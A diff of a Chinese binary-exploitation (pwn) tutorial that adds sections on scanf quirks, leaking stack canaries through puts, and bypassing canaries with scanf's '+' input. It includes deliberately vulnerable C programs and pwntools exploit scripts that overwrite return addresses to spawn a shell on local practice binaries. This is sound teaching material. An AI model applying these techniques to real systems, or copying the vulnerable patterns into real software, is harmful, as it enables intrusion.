@@ -32,35 +32,41 @@ Table of Contents
       * [regerror](#regerror)
     * [实例](#实例)
     * [参考](#参考-1)
+  * [scanf特性](#scanf特性)
+    * [介绍](#介绍-1)
+    * [%d格式化控制符](#d格式化控制符)
+    * [%s格式化控制符](#s格式化控制符)
+    * [参考](#参考-2)
+  * [gets特性](#gets特性)
   * [常用汇编指令](#常用汇编指令)
   * [GitHub入门](#github入门)
   * [Python入门](#python入门)
 * [原理篇](#原理篇)
   * [ret2text](#ret2text)
-    * [介绍](#介绍-1)
+    * [介绍](#介绍-2)
     * [ret2text](#ret2text-1)
       * [Exploit](#exploit)
     * [技巧](#技巧)
     * [实战](#实战)
     * [参考文章](#参考文章)
   * [ret2syscall](#ret2syscall)
-    * [介绍](#介绍-2)
+    * [介绍](#介绍-3)
     * [系统调用](#系统调用)
     * [execve](#execve)
     * [ret2syscall](#ret2syscall-1)
       * [Exploit](#exploit-1)
     * [实战](#实战-1)
-    * [参考](#参考-2)
+    * [参考](#参考-3)
   * [ret2shellcode](#ret2shellcode)
-    * [介绍](#介绍-3)
+    * [介绍](#介绍-4)
     * [shellcode](#shellcode)
     * [EIP/RIP控制](#eiprip控制)
     * [ret2shellcode](#ret2shellcode-1)
       * [Exploit](#exploit-2)
     * [实战](#实战-2)
-    * [参考](#参考-3)
+    * [参考](#参考-4)
   * [ret2libc](#ret2libc)
-    * [介绍](#介绍-4)
+    * [介绍](#介绍-5)
     * [调用约定](#调用约定)
     * [延迟绑定](#延迟绑定)
     * [ret2libc level01](#ret2libc-level01)
@@ -70,9 +76,9 @@ Table of Contents
     * [ret2libc level03](#ret2libc-level03)
       * [Exploit](#exploit-5)
     * [实战](#实战-3)
-    * [参考](#参考-4)
+    * [参考](#参考-5)
   * [format string vuln](#format-string-vuln)
-    * [介绍](#介绍-5)
+    * [介绍](#介绍-6)
     * [printf 基础](#printf-基础)
       * [类型](#类型)
       * [标志](#标志)
@@ -82,21 +88,21 @@ Table of Contents
     * [任意写](#任意写)
       * [Exploit](#exploit-6)
     * [实战](#实战-4)
-    * [参考](#参考-5)
+    * [参考](#参考-6)
   * [format string attack stack](#format-string-attack-stack)
   * [format string attack subfunction](#format-string-attack-subfunction)
   * [integer overflow](#integer-overflow)
   * [ropchain](#ropchain)
-    * [介绍](#介绍-6)
+    * [介绍](#介绍-7)
     * [ropchain](#ropchain-1)
       * [ROPgadget](#ropgadget)
         * [Exploit](#exploit-7)
       * [Ropper](#ropper)
         * [Exploit](#exploit-8)
     * [实战](#实战-5)
-    * [参考](#参考-6)
+    * [参考](#参考-7)
   * [orw shellcode injection](#orw-shellcode-injection)
-    * [介绍](#介绍-7)
+    * [介绍](#介绍-8)
     * [沙盒](#沙盒)
       * [prctl沙盒](#prctl沙盒)
       * [seccomp函数库沙盒](#seccomp函数库沙盒)
@@ -105,45 +111,44 @@ Table of Contents
       * [Exploit](#exploit-9)
       * [pwntools Exploit](#pwntools-exploit)
     * [拓展 BPF](#拓展-bpf)
-    * [参考](#参考-7)
+    * [参考](#参考-8)
   * [or shellcode injection](#or-shellcode-injection)
-    * [介绍](#介绍-8)
+    * [介绍](#介绍-9)
     * [cmp与jz](#cmp与jz)
     * [or shellcode](#or-shellcode)
       * [Exploit](#exploit-10)
     * [实战](#实战-6)
-    * [参考](#参考-8)
+    * [参考](#参考-9)
   * [double shellcode injection](#double-shellcode-injection)
   * [mprotect shellcode injection](#mprotect-shellcode-injection)
-    * [介绍](#介绍-9)
+    * [介绍](#介绍-10)
     * [mprotect](#mprotect)
     * [mprotect shellcode](#mprotect-shellcode)
       * [Exploit](#exploit-11)
     * [实战](#实战-7)
-    * [参考](#参考-9)
+    * [参考](#参考-10)
   * [alphanumeric shellcode injection](#alphanumeric-shellcode-injection)
   * [bypass canary](#bypass-canary)
-    * [介绍](#介绍-10)
+    * [介绍](#介绍-11)
     * [canary保护](#canary保护)
     * [printf leak canary](#printf-leak-canary)
     * [puts leak canary](#puts-leak-canary)
-    * [write leak canary](#write-leak-canary)
     * [scanf输入绕过canary](#scanf输入绕过canary)
     * [爆破canary](#爆破canary)
     * [SSP leak](#ssp-leak)
     * [劫持\_\_stack\_chk\_fail](#劫持__stack_chk_fail)
     * [利用auxv控制](#利用auxv控制)
-    * [参考](#参考-10)
+    * [参考](#参考-11)
   * [dynelf](#dynelf)
   * [one\_gadget use](#one_gadget-use)
   * [stack migrate](#stack-migrate)
-    * [介绍](#介绍-11)
+    * [介绍](#介绍-12)
     * [leave指令](#leave指令)
     * [栈迁移](#栈迁移)
       * [Exploit](#exploit-12)
     * [栈劫持](#栈劫持)
     * [实战](#实战-8)
-    * [参考](#参考-11)
+    * [参考](#参考-12)
   * [vsyscall trick](#vsyscall-trick)
   * [chunk extend and overlapping](#chunk-extend-and-overlapping)
   * [unlink](#unlink)
@@ -158,26 +163,26 @@ Table of Contents
   * [realloc trick](#realloc-trick)
   * [setcontext trick](#setcontext-trick)
   * [fix the symbol table](#fix-the-symbol-table)
-    * [介绍](#介绍-12)
+    * [介绍](#介绍-13)
     * [符号表](#符号表)
     * [剥离符号表](#剥离符号表)
     * [恢复符号表](#恢复符号表)
-    * [参考](#参考-12)
+    * [参考](#参考-13)
 * [工具篇](#工具篇)
   * [ROPgadget](#ropgadget-1)
-    * [介绍](#介绍-13)
+    * [介绍](#介绍-14)
     * [安装](#安装)
     * [使用](#使用)
   * [Ropper](#ropper-1)
-    * [介绍](#介绍-14)
+    * [介绍](#介绍-15)
     * [安装](#安装-1)
     * [使用](#使用-1)
   * [one\_gadget](#one_gadget)
-    * [介绍](#介绍-15)
+    * [介绍](#介绍-16)
     * [安装](#安装-2)
     * [使用](#使用-2)
   * [seccomp\-tools](#seccomp-tools)
-    * [介绍](#介绍-16)
+    * [介绍](#介绍-17)
     * [安装](#安装-3)
     * [使用](#使用-3)
   * [LibcSearcher](#libcsearcher)
@@ -572,6 +577,93 @@ int main() {
 ### 参考
 
 -   https://linux.die.net/man/3/regcomp
+
+## scanf特性
+
+### 介绍
+
+scanf学习C语言开发比较先学习的输入函数, 但是我们从pwn的角度来看该函数, 其实这个函数有很多特性还是挺好玩的
+
+### %d格式化控制符
+
+我们都知道%d是输入一个有符号的整数, 我们来检测一下该格式化控制符具有的一些特性
+
+```c
+#include<stdio.h>
+int main() {
+    int num;
+	scanf("%d", &num);
+    printf("%d\n", num)
+    scanf("%d", &num);
+    printf("%d\n", num);
+    return 0;
+}
+// gcc program.c -o program
+```
+
+这个num没有初始化, 所以num一开始对应的值是内存中的数据
+
+-   正常的输入
+    %d针对的是int类型, 也就是范围在 -2147483648~2147483647, 只要是这个范围的都是正常的输入
+
+![screenshots](Self-help_Clown.assets/screenshots-164906392427111.gif)
+
+-   long long int输入
+    %d可以输入long long int长度的数字, 也就是范围在 -9223372036854775808~9223372036854775807, 只要是这个范围内的数字, 会进行高位截断, 只把低位留给变量
+
+![screenshots](Self-help_Clown.assets/screenshots-164906414006113.gif)
+
+-   超过long long int
+    超过long long int的数字, scanf正数自动接收为-1, 负数接收为0
+
+![screenshots](Self-help_Clown.assets/screenshots-164906427263017.gif)
+
+-   输入非数字的字符
+    如果第一次输入输入一个非数字字符, 将==不会修改num的值==, 而且会把该字符留在输入缓冲中, 等下一次输入取出来, 但是这里第二次输入也是%d, 所以会因为这个字符直接跳过输入
+
+![screenshots](Self-help_Clown.assets/screenshots-164906464378119.gif)
+
+​	如果输入前一部分是数字, 后一部分是非数字, 那么将会把数字给识别了, 然后把非数字留在输入缓冲中, 等待下一次	输入取出, 也就是这里第二次输入会对应输入缓冲中的非数字, 直接跳过了输出
+
+![screenshots](Self-help_Clown.assets/screenshots-164906482701021.gif)
+
+​	但是非数字有两个是例外的, '+'和'-', 这两个字符==会被%d给解析, 但是却不会修改num的值==
+
+![screenshots](Self-help_Clown.assets/screenshots-164906495109923.gif)
+
+%u也有和%d同样的特性
+
+### %s格式化控制符
+
+```c
+scanf("%s", buf);
+```
+
+这条语句是具有溢出漏洞的, 因为它对%s没有进行宽度控制, 所以可以进行无限制输入, 并且scanf是==根据'\n'进行截断, 而不是根据'\x00'==, 这点和printf的%s不同, printf的%s是根据'\x00'截断输出
+
+```c
+#include<stdio.h>
+#include<unistd.h>
+int main() {
+    char buf[0x50] = {0};
+    scanf("%s", buf);
+    write(1, buf, 0x50);
+    return 0;
+}
+// gcc program.c -o program
+```
+
+![screenshots](Self-help_Clown.assets/screenshots-164906571707425.gif)
+
+aaaa和bbbb都打印出来了, '\x00'不可打印所以没有打印出来, '\n'截断, 所以'\n'开始都没有输入到buf中, 而且截断后不会在结尾插入任何东西(gets会在输入结尾插入'\x00')
+
+### 参考
+
+-   https://blog.csdn.net/qq_54218833/article/details/121308367
+
+## gets特性
+
+
 
 ## 常用汇编指令
 
@@ -3067,11 +3159,130 @@ o.interactive()
 
 ![screenshots](Self-help_Clown.assets/screenshots-16489691158886.gif)
 
+gdb查看一下覆盖的结果, 在第二个gets后一条指令设下断点
+
+![screenshots](Self-help_Clown.assets/screenshots-16489831643878.gif)
+
+它的覆盖和预期是一样的
+
 ### puts leak canary
 
-### write leak canary
+我们看过canary的一个特征是有个'\x00'隔断, 而puts函数就是根据'\x00'进行判断字符串的结尾, 如果我们通过溢出把canary的'\x00'覆盖掉, 然后通过puts函数打印buf的时候就会连带着把canary打印出来
+
+printf的%s打印也是同样的道理, printf的%s也是靠'\x00'截断, 修改上面那个例子来看
+
+```c
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+
+void fun() {
+    system("/bin/sh");
+}
+
+int main() {
+    setbuf(stdin, 0);
+    setbuf(stdout, 0);
+    char buf[0x10];
+    read(0, buf, 0x30);
+    puts(buf);
+    read(0, buf, 0x30);
+    return 0;
+}
+// gcc program.c -o program -no-pie -fstack-protector-all
+```
+
+栈布局和上面那个题一样, buf在0x20, canary在0x8, 那么如果要覆盖canary最后一个字节, 大概需要25个字节, 用gdb来看一下过程, 在第一个read函数处设下断点, 注意read函数会把'\n'也会读入, 也就是'\n'会占有一个字节, 所以只需要手动输入24个字节就行
+
+![screenshots](Self-help_Clown.assets/screenshots-16490451935011.gif)
+
+可以看到canary的'\x00'覆盖成了'\x0a', 也就是'\n', 然后puts打印的时候就打印出乱码, 这个乱码就是canary的前一部分, 所以leak部分的代码可以先写了
+
+```python
+from pwn import*
+o = process('./canary2')
+
+# leak canary
+payload = 'a'*24
+o.sendline(payload)	# o.sendline会自动在结尾添加'\n', 所以发24个'a'然后'\n'覆盖canary的'\x00'
+o.recvuntil('\n')	# '\n'之后的7个字节就是canary
+canary = u64('\x00'+o.recv(7))	# 由于覆盖了最后的那个'\x00', 所以要添加回来
+print hex(canary)
+o.interactive()
+```
+
+![screenshots](Self-help_Clown.assets/screenshots-16490457413573.gif)
+
+接下来就和上面那个一样的操作了
+
+```python
+from pwn import*
+o = process('./canary2')
+
+fun = 0x4006A7
+
+# leak canary
+payload = 'a'*24
+o.sendline(payload)	# o.sendline会自动在结尾添加'\n', 所以发24个'a'然后'\n'覆盖canary的'\x00'
+o.recvuntil('\n')	# '\n'之后的7个字节就是canary
+canary = u64('\x00'+o.recv(7))	# 由于覆盖了最后的那个'\x00', 所以要添加回来
+print hex(canary)
+payload = 'a'*24 + p64(canary) + 'a'*8 + p64(fun)
+o.sendline(payload)
+o.interactive()
+```
+
+![screenshots](Self-help_Clown.assets/screenshots-16490484739757.gif)
 
 ### scanf输入绕过canary
+
+在[scanf特性](#scanf特性)里讲过, 如果%d或者%u输入'+'或者'-'则可以不修改变量的值, 我们可以以此来出一道题
+
+```c
+#include<stdio.h>
+#include<stdlib.h>
+
+void fun() {
+    system("/bin/sh");
+}
+
+int main() {
+    long long int num[10] = {0};
+    long long int *ptr = num;
+    for(int i = 0; i <= 13; i++) {
+        scanf("%lld", ptr);
+        ptr += 1;
+    }
+    return 0;
+}
+// gcc program.c -o program -no-pie -fstack-protector-all
+```
+
+for循环明显的数组越界, scanf的%lld是读取long long int, 这个数组越界刚好到函数返回地址, 但是就是有canary, 那么就需要想办法去绕过, 我们讲过'+'和'-'对于%d可以跳过输入, 那么这里就可以利用这条原理, 在对canary那条栈帧输入的时候用'+'就可以保持canary的值, 从而绕过canary
+
+fun函数地址为0x4005C7
+
+![screenshots](Self-help_Clown.assets/screenshots-164906802690527.gif)
+
+可以看打我们手动就实现了覆盖函数返回地址为fun函数地址获取到flag了
+
+脚本可以写为
+
+```python
+from pwn import*
+o = process('./canary3')
+fun = 0x4005C7
+for i in range(0, 13):
+    o.sendline('+')
+o.sendline(str(fun))
+o.interactive()
+```
+
+gdb调试来看一下, 在scanf处设下断点
+
+![screenshots](Self-help_Clown.assets/screenshots-164906839944129.gif)
+
+可以就看到前面所有栈内容都没有被改变, 然后直到输入覆盖函数返回地址处写入fun函数地址, 最后就跳转去system执行"/bin/sh"了
 
 ### 爆破canary
 
